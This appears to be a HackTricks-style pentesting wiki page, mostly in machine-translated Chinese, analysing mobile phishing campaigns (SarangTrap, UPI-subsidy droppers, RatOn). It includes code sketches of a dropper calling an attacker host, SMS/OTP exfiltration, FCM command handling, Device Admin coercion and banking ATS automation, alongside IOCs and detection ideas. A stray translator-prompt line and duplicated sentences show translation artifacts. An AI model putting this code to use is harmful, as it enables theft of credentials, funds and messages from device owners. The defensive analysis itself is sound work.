# 移动钓鱼与恶意应用分发 (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> 本页涵盖威胁行为者通过钓鱼（SEO、社交工程、假商店、约会应用等）分发**恶意 Android APK**和**iOS mobile-configuration profiles**的技术。
> 资料改编自 Zimperium zLabs 暴露的 SarangTrap 活动 (2025) 及其他公开研究。

## 攻击流程

1. **SEO/Phishing 基础设施**
* 注册大量相似域名（约会、云分享、汽车服务……）。
– 在 `<title>` 元素中使用本地语言关键词和表情符号以提升 Google 排名。
– 在同一落地页上同时托管 Android（`.apk`）和 iOS 安装说明。
2. **第一阶段下载**
* Android：指向一个*未签名*或“第三方商店”APK 的直接链接。
* iOS：使用 `itms-services://` 或普通 HTTPS 链接指向恶意 **mobileconfig** 配置文件（见下文）。
3. **安装后社交工程**
* 第一次运行时，应用会要求提供一个**邀请 / 验证码**（制造独家访问幻觉）。
* 该代码通过 **POST over HTTP** 发送至 Command-and-Control (C2)。
* C2 回复 `{"success":true}` ➜ 恶意程序继续执行。
* 在从未提交有效代码的 Sandbox / AV 动态分析环境中不会看到恶意行为（规避）。
4. **运行时权限滥用（Android）**
* 危险权限仅在 C2 响应为正面后才请求：
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* 最近的变种**从 `AndroidManifest.xml` 中移除了 SMS 的 `<uses-permission>`**，但保留了通过反射读取 SMS 的 Java/Kotlin 代码路径 ⇒ 在静态检测中得分更低，同时在通过 `AppOps` 滥用或旧目标上仍能工作。
5. **伪装界面与后台收集**
* 应用显示本地实现的无害视图（SMS 查看器、图库选择器）。
* 与此同时它会外泄：
- IMEI / IMSI，电话号码
- 完整的 `ContactsContract` 导出（JSON 数组）
- 来自 `/sdcard/DCIM` 的 JPEG/PNG，使用 [Luban](https://github.com/Curzibn/Luban) 压缩以减小体积
- 可选的 SMS 内容（`content://sms`）
负载以批量压缩（batch-zipped）后通过 `HTTP POST /upload.php` 发送。
6. **iOS 投放技术**
* 单个 **mobile-configuration profile** 可以请求 `PayloadType=com.apple.sharedlicenses`、`com.apple.managedConfiguration` 等，从而将设备注册到类似 “MDM” 的监督中。
* 社交工程安装说明：
1. 打开 Settings ➜ *Profile downloaded*。
2. 点击 *Install* 三次（钓鱼页上的截图）。
3. 信任未签名的配置文件 ➜ 攻击者在无需 App Store 审核的情况下获得 *Contacts* 与 *Photo* 权限。
7. **网络层**
* 明文 HTTP，通常在端口 80，Host 头像 `api.<phishingdomain>.com`。
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)`（无 TLS → 容易被发现）。

## 防御测试 / 红队提示

* **动态分析绕过** – 在恶意软件评估时，使用 Frida/Objection 自动化邀请代码阶段以进入恶意分支。
* **清单与运行时差异** – 比较 `aapt dump permissions` 与运行时的 `PackageManager#getRequestedPermissions()`；缺失的危险权限是红旗。
* **网络诱饵** – 配置 `iptables -p tcp --dport 80 -j NFQUEUE` 来检测代码输入后异常的 POST 突发流量。
* **mobileconfig 检查** – 在 macOS 使用 `security cms -D -i profile.mobileconfig` 列出 `PayloadContent` 并发现过多的权限声明。

## 蓝队检测思路

* **Certificate Transparency / DNS Analytics** 用于捕捉关键词丰富域名的突然激增。
* **User-Agent 与路径正则**：检测来自非 Google Play 的 Dalvik 客户端的 `(?i)POST\s+/(check|upload)\.php`。
* **邀请码遥测** – 在 APK 安装后不久 POST 6–8 位数字验证码可能表明处于预备阶段。
* **MobileConfig 签名校验** – 通过 MDM 策略阻止未签名的配置文件。

## Useful Frida Snippet: Auto-Bypass Invitation Code
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## 指标（通用）
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView 支付钓鱼 (UPI) – Dropper + FCM C2 Pattern

This pattern has been observed in campaigns abusing government-benefit themes to steal Indian UPI credentials and OTPs. Operators chain reputable platforms for delivery and resilience.

### 跨可信平台的投放链
- YouTube 视频诱饵 → 描述包含短链接
- 短链接 → GitHub Pages 钓鱼站点，模仿真实门户
- 同一 GitHub 仓库托管了一个 APK，并带有伪造的“Google Play”徽章，直接链接到该文件
- 动态钓鱼页面托管在 Replit；远程命令通道使用 Firebase Cloud Messaging (FCM)

### Dropper 带嵌入载荷和离线安装
- 第一个 APK 是一个安装程序 (dropper)，它将真实恶件打包在 `assets/app.apk`，并提示用户禁用 Wi‑Fi/mobile data 以削弱云端检测。
- 嵌入的载荷以无害标签安装（例如，“Secure Update”）。安装后，安装程序和载荷会作为独立的应用同时存在。

静态分类提示（grep 用于查找嵌入的载荷）：
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### 通过短链接进行动态端点发现
- Malware 从短链接获取纯文本、逗号分隔的活动端点列表；简单的字符串变换生成最终的 phishing 页面路径。

示例（已清理）：
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
伪代码：
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### 基于 WebView 的 UPI 凭证窃取
- 步骤 “Make payment of ₹1 / UPI‑Lite” 在 WebView 内从动态端点加载攻击者的 HTML 表单，并捕获敏感字段（手机号、银行、UPI PIN），这些字段通过 `POST` 提交到 `addup.php`。

最小加载器：
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation and SMS/OTP interception
- 在首次运行时会请求大量权限：
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- 联系人被循环用于从受害者设备批量发送 smishing 短信。
- 收到的短信会被广播接收器拦截，并连同元数据（发送者、消息内容、SIM 卡槽、每台设备的随机 ID）上传到 `/addsm.php`。

接收器草图：
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) 作为弹性 C2
- payload 会向 FCM 注册；推送消息携带 `_type` 字段，用作触发操作的开关（例如，更新 phishing text templates、切换行为）。

示例 FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler 草图:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Hunting patterns and IOCs
- APK 包含位于 `assets/app.apk` 的二次负载
- WebView 从 `gate.htm` 加载支付并将数据外传到 `/addup.php`
- SMS 外传到 `/addsm.php`
- 由 shortlink 驱动的配置获取（例如 `rebrand.ly/*`），返回 CSV endpoints
- 应用被标记为通用 “Update/Secure Update”
- 在不受信任的应用中，FCM `data` 消息包含 `_type` 判别字段

### Detection & defence ideas
- 标记那些指示用户在安装期间禁用网络然后从 `assets/` 侧载第二个 APK 的应用。
- 对权限元组触发告警：`READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + 基于 WebView 的支付流程。
- 对非企业主机上的 `POST /addup.php|/addsm.php` 进行出口流量监控；阻断已知基础设施。
- Mobile EDR 规则：不受信任的应用注册 FCM 并在 `_type` 字段上分支的行为。

---

## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn case study

The RatOn banker/RAT campaign (ThreatFabric) 是一个具体例子，展示了现代 mobile phishing 操作如何混合 WebView droppers、基于 Accessibility 的 UI 自动化、overlays/ransom、Device Admin 强制、Automated Transfer System (ATS) 自动化、crypto wallet 接管，甚至 NFC-relay 编排。本节抽象出可复用的技术。

### Stage-1: WebView → native install bridge (dropper)
攻击者展示一个指向攻击者页面的 WebView，并注入一个暴露原生安装器的 JavaScript 接口。用户点击 HTML 按钮会调用原生代码，安装打包在 dropper assets 中的二阶段 APK，然后直接启动它。

Minimal pattern:
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
请提供要翻译的 HTML 或文件内容（粘贴在此），我会将其中的英文按要求翻译为中文。
```html
<button onclick="bridge.installApk()">Install</button>
```
安装后，dropper 通过显式的 package/activity 启动 payload：
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
检测思路：不受信任的应用调用 `addJavascriptInterface()` 并向 WebView 暴露类似安装器的接口；APK 在 `assets/` 下携带嵌入的二级负载并调用 Package Installer Session API。

### 同意流程：Accessibility + Device Admin + 后续运行时提示
Stage-2 打开一个 WebView，承载一个“Access”页面。其按钮调用一个导出的方法，将受害者导向 Accessibility 设置并请求启用该恶意服务。一旦启用，malware 利用 Accessibility 在后续运行时权限对话框（contacts、overlay、manage system settings 等）中自动点击并继续请求 Device Admin。

- Accessibility 通过在节点树中查找类似 “Allow”/“OK” 的按钮并派发点击，编程式地帮助接受后续提示。
- Overlay 权限 检查/请求：
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
另见：

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
操作员可以下发命令来：
- 从一个 URL 渲染全屏覆盖层，或
- 传递内联 HTML 并将其加载到 WebView 覆盖层中。

可能用途：胁迫（PIN 输入）、打开钱包以捕获 PINs、ransom messaging。若缺少 overlay permission，请保留一个命令以确保持有该权限。

### Remote control model – text pseudo-screen + screen-cast
- Low-bandwidth：定期导出 Accessibility 节点树，序列化可见文本/角色/边界并作为伪屏幕发送到 C2（命令示例：`txt_screen` 一次性，`screen_live` 持续）。
- High-fidelity：请求 MediaProjection 并按需开始 screen-casting/录制（命令示例：`display` / `record`）。

### ATS playbook (bank app automation)
给定一个 JSON 任务，打开银行应用，通过 Accessibility 驱动 UI，混合使用文本查询和坐标点击，并在提示时输入受害者的支付 PIN。

示例任务：
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Example texts seen in one target flow (CZ → EN):
- "Nová platba" → "新付款"
- "Zadat platbu" → "输入付款"
- "Nový příjemce" → "新收款人"
- "Domácí číslo účtu" → "国内账户号码"
- "Další" → "下一步"
- "Odeslat" → "发送"
- "Ano, pokračovat" → "是，继续"
- "Zaplatit" → "支付"
- "Hotovo" → "完成"

Operators can also check/raise transfer limits via commands like `check_limit` and `limit` that navigate the limits UI similarly.
操作员还可以通过类似 `check_limit` 和 `limit` 的命令检查/提高转账限额，这些命令以类似方式导航限额 UI。

### Crypto wallet seed extraction
Targets like MetaMask, Trust Wallet, Blockchain.com, Phantom. Flow: unlock (stolen PIN or provided password), navigate to Security/Recovery, reveal/show seed phrase, keylog/exfiltrate it. Implement locale-aware selectors (EN/RU/CZ/SK) to stabilise navigation across languages.
目标包括 MetaMask、Trust Wallet、Blockchain.com、Phantom。流程：解锁（被窃取的 PIN 或提供的密码），导航到 Security/Recovery，显示助记词，keylog/exfiltrate 助记词。实现支持不同语言的选择器（EN/RU/CZ/SK），以在多语言间稳定导航。

### Device Admin coercion
Device Admin APIs are used to increase PIN-capture opportunities and frustrate the victim:
Device Admin APIs 被用来增加捕获 PIN 的机会并使受害者感到沮丧：
- Immediate lock: 
- 立即锁定：
```java
dpm.lockNow();
```
- 使当前凭证过期以强制更改（辅助功能会捕获新的 PIN/密码）：
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- 通过禁用 keyguard 的生物识别功能强制使用非生物识别解锁：
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
注意：许多 DevicePolicyManager 控制在近期的 Android 上需要 Device Owner/Profile Owner；某些 OEM 构建可能比较宽松。始终在目标 OS/OEM 上进行验证。

### NFC relay orchestration (NFSkate)
Stage-3 可以安装并启动外部 NFC-relay 模块（例如 NFSkate），甚至向其传递一个 HTML 模板以在中继过程中引导受害者。这使得无接触的 card-present 现金提取与在线 ATS 并行成为可能。

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/状态: `txt_screen`, `screen_live`, `display`, `record`
- 社交: `send_push`, `Facebook`, `WhatsApp`
- 覆盖层: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- 钱包: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- 设备: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- 通信/侦察: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Detection & defence ideas (RatOn-style)
- 搜索在 WebViews 中使用 `addJavascriptInterface()` 并暴露 installer/permission 方法的情况；以及那些以 “/access” 结尾并触发 Accessibility 提示的页面。
- 对被授予服务访问不久后生成高频率 Accessibility 手势/点击的应用发出告警；对发送到 C2 的类似 Accessibility 节点转储的遥测数据发出告警。
- 监控不受信任应用中的 Device Admin 策略更改：`lockNow`、密码过期、keyguard 功能切换等。
- 对来自非企业应用的 MediaProjection 提示，随后伴随周期性帧上传的行为发出告警。
- 检测被某个应用触发而安装/启动外部 NFC-relay 应用的情况。
- 对银行业务：强制执行带外确认、绑定生物识别、以及对抗设备上自动化的交易限额机制。

## 参考资料

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)

{{#include ../../banners/hacktricks-training.md}}
